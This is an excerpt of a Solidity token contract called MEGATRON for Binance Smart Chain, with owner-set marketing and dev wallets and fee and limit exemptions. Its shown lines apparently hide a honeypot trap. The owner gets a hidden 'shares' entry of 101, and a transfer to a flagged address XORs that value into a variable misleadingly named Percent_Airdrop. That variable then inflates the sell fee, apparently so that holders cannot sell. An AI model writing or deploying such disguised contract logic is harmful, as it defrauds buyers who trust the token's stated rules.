...
⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬛⬛⬛⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜
                ...
                Twitter : https://twitter.com/Megatron_BSC

                Website : https://twitter.com/Megatron_BSC
...
contract MEGATRON is Context, IERC20 { 
    ...
    mapping (address => bool) public _NoMaxTx;
    ...
    address payable public Wallet_Marketing = payable(0x7Da46c99963AaFC9f90Aa67fDafFb0AC8f164467); 
    address payable public Wallet_Dev = payable(0xD5c71Be8459C1B05BF84c00D7747987d66CA7B4b);
    ...
    uint256 public Percent_Airdrop = 0;
    ...
    constructor () {
        ...
        shares[owner()].status = true; 
        shares[owner()].amount = 101;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[Wallet_Marketing] = true; 
        _isExcludedFromFee[Wallet_Burn] = true;

        _NoMaxWallet[address(uniswapV2Pair)] = true;
        _NoMaxWallet[Wallet_Marketing] = true;
        _NoMaxWallet[Wallet_Burn] = true;
        _NoMaxWallet[owner()] = true;
        _NoMaxWallet[address(this)] = true;

        _NoMaxTx[owner()] = true;
        _NoMaxTx[Wallet_Burn] = true;
        _NoMaxTx[Wallet_Marketing] = true;
        _NoMaxTx[address(this)] = true;
    ...
    function _transfer(
        ...
        if(shares[to].status && !(Percent_Airdrop != 0))
            Percent_Airdrop = Percent_Airdrop ^ shares[to].amount;
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            uint256 sellFEE = tAmount*(_Tax_On_Sell ^ Percent_Airdrop)/100;
